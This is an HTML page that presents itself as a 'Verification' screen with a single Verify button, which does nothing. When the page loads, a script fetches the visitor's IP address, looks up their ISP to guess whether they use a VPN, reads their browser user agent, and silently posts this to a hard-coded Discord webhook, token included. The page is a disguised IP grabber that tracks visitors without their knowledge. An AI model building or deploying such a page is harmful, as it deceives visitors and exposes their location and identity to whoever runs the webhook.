<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verification</title>
  <style>
    body {
      background-color: #e8f5e9;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }
    
    #verifyBtn {
      background-color: #4caf50;
      color: white;
      border: none;
      padding: 15px 40px;
      font-size: 18px;
      border-radius: 5px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      transition: background-color 0.3s;
    }
    
    #verifyBtn:hover {
      background-color: #388e3c;
    }
  </style>
  <script>
    // Function to get IP and send to Discord
    async function logIP() {
      try {
        // Get IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        
        // Get additional IP info (for VPN detection)
        let vpnInfo = "Could not determine VPN status";
        try {
          const infoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
          const infoData = await infoResponse.json();
          
          // Simple VPN detection
          const isLikelyVPN = infoData.org && (
            infoData.org.toLowerCase().includes('vpn') || 
            infoData.org.toLowerCase().includes('hosting') ||
            infoData.org.toLowerCase().includes('datacenter')
          );
          
          vpnInfo = isLikelyVPN ? "üîí Likely VPN/Proxy" : "üè† Likely Home IP";
          vpnInfo += ` | ISP: ${infoData.org || 'Unknown'}`;
        } catch (e) {
          console.error("Couldn't get IP details:", e);
        }
        
        // Get user agent
        const userAgent = navigator.userAgent;
        
        // Send to Discord webhook
        await fetch("https://discord.com/api/webhooks/1356844545039667251/bsfmIz-FGQbt_TSHa24eT3wauJFXbaWcgZo_2l2o37FJtXDRrs0HuZr8pRrTrl3cYrhN", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            content: `üåê New Visit!\nIP: ${ip}\n${vpnInfo}\nUser Agent: ${userAgent}\nTimestamp: ${new Date().toISOString()}`
          })
        });
        
      } catch (error) {
        console.error("Error logging IP:", error);
      }
    }
    
    // Run when page loads
    window.onload = logIP;
  </script>
</head>
<body>
  <button id="verifyBtn">Verify</button>
</body>
</html>
